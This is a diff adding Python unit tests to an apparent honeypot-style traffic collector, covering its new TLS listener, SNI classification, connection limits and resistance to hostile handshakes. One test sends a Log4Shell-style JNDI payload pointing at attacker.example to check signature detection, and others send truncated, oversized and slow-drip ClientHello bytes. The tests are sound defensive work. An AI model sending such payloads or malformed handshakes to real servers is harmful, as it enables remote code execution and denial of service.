@@ -2,7 +2,10 @@ import dataclasses
 import datetime as dt
 import http.client
 import json
+import os
 import socket
+import ssl
+import subprocess
 import tempfile
 import threading
 import time
@@ -11,7 +14,13 @@ from unittest import mock
 from pathlib import Path
 
 import collector
-from collector import CollectorConfig, classify_host_header, create_server, prune_temp_jsonl
+from collector import (
+    CollectorConfig,
+    classify_host_header,
+    classify_sni,
+    create_server,
+    prune_temp_jsonl,
+)
 from signatures import (
     SIGNATURE_RULES,
     InspectionInput,
@@ -1185,6 +1194,47 @@ class SlowClientDeadlineTests(unittest.TestCase):
             time.sleep(0.5)
             self.assertFalse((Path(d) / "metrics.json").exists(), "worker kept writing after close")
 
+    def test_worker_start_failure_returns_the_slot(self) -> None:
+        """A worker that cannot start (TasksMax) must not leak its slot."""
+        with tempfile.TemporaryDirectory() as d:
+            server, thread = self._server(Path(d))
+            port = server.server_address[1]
+            real_start = threading.Thread.start
+            calls = {"n": 0}
+
+            def failing_start(self_thread):  # type: ignore[no-untyped-def]
+                if self_thread.name.startswith("Thread") and calls["n"] == 0 and getattr(
+                    self_thread, "_target", None
+                ) == server.process_request_thread:
+                    calls["n"] += 1
+                    raise RuntimeError("can't start new thread")
+                return real_start(self_thread)
+
+            try:
+                with mock.patch.object(threading.Thread, "start", failing_start):
+                    s = socket.create_connection(("127.0.0.1", port), timeout=3)
+                    try:
+                        s.recv(16)  # closed without a worker
+                    except OSError:
+                        pass
+                    s.close()
+                    time.sleep(0.2)
+                self.assertEqual(calls["n"], 1)
+                self.assertEqual(server.rejected_overload, 1)
+                # Both slots are still available afterwards.
+                self.assertTrue(server.connection_semaphore.acquire(blocking=False))
+                self.assertTrue(server.connection_semaphore.acquire(blocking=False))
+                server.connection_semaphore.release()
+                server.connection_semaphore.release()
+                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
+                conn.request("GET", "/after")
+                self.assertEqual(conn.getresponse().status, 404)
+                conn.close()
+            finally:
+                server.shutdown()
+                server.server_close()
+                thread.join(timeout=2)
+
     def test_fast_requests_are_unaffected_by_the_deadline(self) -> None:
         with tempfile.TemporaryDirectory() as d:
             server, thread = self._server(Path(d))
@@ -1200,6 +1250,315 @@ class SlowClientDeadlineTests(unittest.TestCase):
                 server.shutdown()
                 server.server_close()
                 thread.join(timeout=2)
+
+
+CERT_SCRIPT = Path(__file__).with_name("generate_tls_cert.sh")
+
+
+def _client_context(cafile: Path) -> ssl.SSLContext:
+    ctx = ssl.create_default_context(cafile=str(cafile))
+    ctx.check_hostname = True  # the generated SAN is DNS:localhost
+    return ctx
+
+
+class TlsCollectorTests(unittest.TestCase):
+    """#93: HTTPS on 443 with a host-generated self-signed certificate."""
+
+    @classmethod
+    def setUpClass(cls) -> None:
+        cls.certdir = tempfile.TemporaryDirectory()
+        tls = Path(cls.certdir.name) / "tls"
+        subprocess.run(
+            ["bash", str(CERT_SCRIPT), "--dir", str(tls)],
+            check=True,
+            capture_output=True,
+        )
+        cls.cert = tls / "cert.pem"
+        cls.key = tls / "key.pem"
+
+    @classmethod
+    def tearDownClass(cls) -> None:
+        cls.certdir.cleanup()
+
+    def _server(self, tmp: Path, **overrides):
+        overrides.setdefault("metrics_flush_seconds", 0)
+        cfg = CollectorConfig(
+            host="127.0.0.1",
+            port=0,
+            protocol_label="https",
+            reported_dst_port=443,
+            output_jsonl=tmp / "events.jsonl",
+            socket_timeout_seconds=overrides.pop("socket_timeout_seconds", 1.0),
+            max_concurrent_connections=overrides.pop("max_concurrent_connections", 4),
+            max_connection_seconds=overrides.pop("max_connection_seconds", 1.5),
+            metrics_path=tmp / "metrics.json",
+            tls_cert_path=self.cert,
+            tls_key_path=self.key,
+            **overrides,
+        )
+        server = create_server(cfg)
+        thread = threading.Thread(target=server.serve_forever, daemon=True)
+        thread.start()
+        self.addCleanup(thread.join, 2)
+        self.addCleanup(server.server_close)
+        self.addCleanup(server.shutdown)
+        return server
+
+    def _https_get(self, port: int, path: str, headers: dict | None = None) -> int:
+        conn = http.client.HTTPSConnection(
+            "localhost", port, timeout=3, context=_client_context(self.cert)
+        )
+        try:
+            conn.request("GET", path, headers=headers or {})
+            return conn.getresponse().status
+        finally:
+            conn.close()
+
+    @staticmethod
+    def _records(tmp: Path) -> list[dict]:
+        path = tmp / "events.jsonl"
+        if not path.exists():
+            return []
+        return [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines() if line]
+
+    def test_records_https_request_with_tls_kind_labels_only(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            tmp = Path(d)
+            server = self._server(tmp)
+            status = self._https_get(server.server_address[1], "/remote/login?user=admin&password=hunter2")
+            self.assertEqual(status, 404)
+            [record] = self._records(tmp)
+            self.assertEqual(record["protocol"], "https")
+            self.assertEqual(record["dst_port"], 443)
+            # SNI "localhost" is reduced to a kind; no value is stored anywhere.
+            self.assertEqual(record["metadata"]["tls"]["sni_kind"], "hostname")
+            self.assertIn(record["metadata"]["tls"]["version"], ("TLSv1.2", "TLSv1.3"))
+            raw = (tmp / "events.jsonl").read_text(encoding="utf-8")
+            self.assertNotIn("localhost", raw)
+            self.assertNotIn("hunter2", raw)
+
+    def test_sni_ip_literal_and_absent_are_classified(self) -> None:
+        self.assertEqual(classify_sni(None), "absent")
+        self.assertEqual(classify_sni(""), "absent")
+        self.assertEqual(classify_sni("203.0.113.7"), "ip_literal")
+        self.assertEqual(classify_sni("[2001:db8::1]"), "ip_literal")
+        self.assertEqual(classify_sni("vpn.example.com"), "hostname")
+        with tempfile.TemporaryDirectory() as d:
+            tmp = Path(d)
+            server = self._server(tmp)
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            with socket.create_connection(("127.0.0.1", server.server_address[1]), timeout=3) as raw:
+                with ctx.wrap_socket(raw) as tls:  # no server_hostname: no SNI
+                    tls.sendall(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
+                    tls.recv(64)
+            time.sleep(0.2)
+            self.assertEqual(self._records(tmp)[0]["metadata"]["tls"]["sni_kind"], "absent")
+
+    def test_signature_detections_match_on_http_and_https(self) -> None:
+        payload = "${jndi:ldap://attacker.example/a}"
+        with tempfile.TemporaryDirectory() as d:
+            tmp = Path(d)
+            server = self._server(tmp)
+            self._https_get(server.server_address[1], "/", {"User-Agent": payload})
+            https_hits = self._records(tmp)[0]["metadata"]["signature_detections"]
+        with tempfile.TemporaryDirectory() as d:
+            cfg = CollectorConfig(host="127.0.0.1", port=0, output_jsonl=Path(d) / "e.jsonl")
+            plain = create_server(cfg)
+            t = threading.Thread(target=plain.serve_forever, daemon=True)
+            t.start()
+            try:
+                conn = http.client.HTTPConnection("127.0.0.1", plain.server_address[1], timeout=3)
+                conn.request("GET", "/", headers={"User-Agent": payload})
+                conn.getresponse()
+                conn.close()
+            finally:
+                plain.shutdown()
+                plain.server_close()
+                t.join(timeout=2)
+            http_hits = json.loads((Path(d) / "e.jsonl").read_text().splitlines()[0])["metadata"][
+                "signature_detections"
+            ]
+        self.assertTrue(https_hits)
+        self.assertEqual(https_hits, http_hits)
+        self.assertNotIn("attacker.example", json.dumps(https_hits))
+
+    def test_hostile_handshakes_fail_within_deadline_while_legit_client_is_served(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            tmp = Path(d)
+            server = self._server(tmp, max_concurrent_connections=6)
+            port = server.server_address[1]
+            hostile: list[socket.socket] = []
+            # R1: an idle TCP connection that never sends a ClientHello.
+            hostile.append(socket.create_connection(("127.0.0.1", port), timeout=5))
+            # Plaintext HTTP to the TLS port.
+            s = socket.create_connection(("127.0.0.1", port), timeout=5)
+            s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
+            hostile.append(s)
+            # Truncated ClientHello: a handshake record header promising more.
+            s = socket.create_connection(("127.0.0.1", port), timeout=5)
+            s.sendall(b"\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03")
+            hostile.append(s)
+            # Oversized ClientHello: a record far above the TLS record limit.
+            s = socket.create_connection(("127.0.0.1", port), timeout=5)
+            try:
+                s.sendall(b"\x16\x03\x01\xff\xff" + b"\x01" * 65535)
+            except OSError:
+                pass  # the server may already have closed: fine
+            hostile.append(s)
+            try:
+                time.sleep(0.2)
+                started = time.monotonic()
+                self.assertEqual(self._https_get(port, "/legit"), 404)
+                self.assertLess(time.monotonic() - started, 1.0, "legit client was blocked")
+                # Every hostile connection is closed by the server within the deadline.
+                for sock in hostile:
+                    sock.settimeout(3.0)
+                    deadline = time.monotonic() + 3.0
+                    while time.monotonic() < deadline:
+                        try:
+                            if sock.recv(4096) == b"":
+                                break
+                        except (ConnectionResetError, BrokenPipeError):
+                            break
+                        except socket.timeout:
+                            self.fail("server kept a hostile connection open past the deadline")
+                time.sleep(0.3)
+                self.assertGreaterEqual(server.tls_handshake_failed, 4)
+                # All slots were released.
+                for _ in range(6):
+                    self.assertTrue(server.connection_semaphore.acquire(blocking=False))
+                for _ in range(6):
+                    server.connection_semaphore.release()
+                # Only the legitimate request was recorded; no raw bytes kept.
+                records = self._records(tmp)
+                self.assertEqual([r["http_path"] for r in records], ["/legit"])
+            finally:
+                for sock in hostile:
+                    sock.close()
+
+    def test_slow_drip_during_handshake_is_cut_by_the_absolute_deadline(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            server = self._server(Path(d), max_connection_seconds=1.0, socket_timeout_seconds=2.5)
+            sock = socket.create_connection(("127.0.0.1", server.server_address[1]), timeout=5)
+            # A record header promising 255 bytes, then the body one byte at a
+            # time: OpenSSL cannot parse (or reject) it until the record is whole.
+            hello = b"\x16\x03\x01\x00\xff" + b"\x01" * 255
+            started = time.monotonic()
+            try:
+                for byte in hello:
+                    sock.sendall(bytes([byte]))
+                    time.sleep(0.3)  # faster than the recv timeout
+                    if time.monotonic() - started > 4:
+                        break
+            except OSError:
+                pass  # cut by the server: expected
+            finally:
+                sock.close()
+            self.assertLess(time.monotonic() - started, 3.5)
+            time.sleep(0.2)
+            self.assertGreaterEqual(server.deadline_exceeded, 1)
+            self.assertGreaterEqual(server.tls_handshake_failed, 1)
+
+    def test_overload_on_tls_listener_closes_without_writing(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            server = self._server(Path(d), max_concurrent_connections=1, max_connection_seconds=3.0)
+            port = server.server_address[1]
+            holder = socket.create_connection(("127.0.0.1", port), timeout=5)
+            try:
+                time.sleep(0.2)
+                shed = socket.create_connection(("127.0.0.1", port), timeout=3)
+                try:
+                    try:
+                        data = shed.recv(4096)
+                    except ConnectionResetError:
+                        data = b""
+                    self.assertEqual(data, b"", "overload path wrote to an unhandshaken TLS socket")
+                finally:
+                    shed.close()
+                self.assertGreaterEqual(server.rejected_overload, 1)
+            finally:
+                holder.close()
+
+    def test_rejects_tls_below_1_2_and_offers_only_http11_alpn(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            server = self._server(Path(d))
+            port = server.server_address[1]
+            old = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            old.check_hostname = False
+            old.verify_mode = ssl.CERT_NONE
+            try:
+                old.minimum_version = ssl.TLSVersion.TLSv1
+                old.maximum_version = ssl.TLSVersion.TLSv1_1
+            except (ValueError, ssl.SSLError):
+                self.skipTest("client OpenSSL cannot offer TLS 1.1")
+            with socket.create_connection(("127.0.0.1", port), timeout=3) as raw:
+                with self.assertRaises((ssl.SSLError, OSError)):
+                    with old.wrap_socket(raw) as tls:
+                        tls.do_handshake()
+            ctx = _client_context(self.cert)
+            ctx.set_alpn_protocols(["h2", "http/1.1"])
+            with socket.create_connection(("127.0.0.1", port), timeout=3) as raw:
+                with ctx.wrap_socket(raw, server_hostname="localhost") as tls:
+                    self.assertEqual(tls.selected_alpn_protocol(), "http/1.1")
+                    self.assertIn(tls.version(), ("TLSv1.2", "TLSv1.3"))
+
+    def test_handshake_failures_print_nothing(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            server = self._server(Path(d))
+            port = server.server_address[1]
+            with mock.patch("sys.stderr") as err:
+                for _ in range(3):
+                    s = socket.create_connection(("127.0.0.1", port), timeout=3)
+                    s.sendall(b"GET / HTTP/1.0\r\n\r\n")
+                    try:
+                        s.recv(64)
+                    except OSError:
+                        pass
+                    s.close()
+                time.sleep(0.3)
+            written = "".join(str(c.args[0]) for c in err.write.call_args_list)
+            self.assertEqual(written, "")
+            self.assertGreaterEqual(server.tls_handshake_failed, 3)
+
+    def test_tls_context_disables_tickets_for_all_versions(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            server = self._server(Path(d))
+            ctx = server.tls_context
+            self.assertEqual(ctx.num_tickets, 0)  # TLS 1.3
+            self.assertTrue(ctx.options & ssl.OP_NO_TICKET)  # TLS 1.2
+            self.assertTrue(ctx.options & ssl.OP_NO_COMPRESSION)
+
+    def test_metrics_include_tls_handshake_failures(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            server = self._server(Path(d))
+            server.count("tls_handshake_failed")
+            server.write_metrics()
+            data = json.loads((Path(d) / "metrics.json").read_text())
+            self.assertEqual(data["tls_handshake_failed"], 1)
+
+    def test_cert_and_key_must_be_configured_together(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            with self.assertRaises(ValueError):
+                create_server(
+                    CollectorConfig(
+                        host="127.0.0.1", port=0, output_jsonl=Path(d) / "e.jsonl", tls_cert_path=self.cert
+                    )
+                )
+
+    def test_cert_script_key_is_private_and_subject_is_generic(self) -> None:
+        mode = os.stat(self.key).st_mode & 0o777
+        self.assertEqual(mode, 0o600)
+        out = subprocess.run(
+            ["openssl", "x509", "-in", str(self.cert), "-noout", "-subject", "-issuer", "-text"],
+            check=True, capture_output=True, text=True,
+        ).stdout.lower()
+        for marker in ("attackarium", "opencanary", "honeypot", "canary"):
+            self.assertNotIn(marker, out)
+        self.assertIn("prime256v1", out)
+        self.assertNotIn("private", self.cert.read_text().lower())
+
 
 if __name__ == "__main__":
     unittest.main()
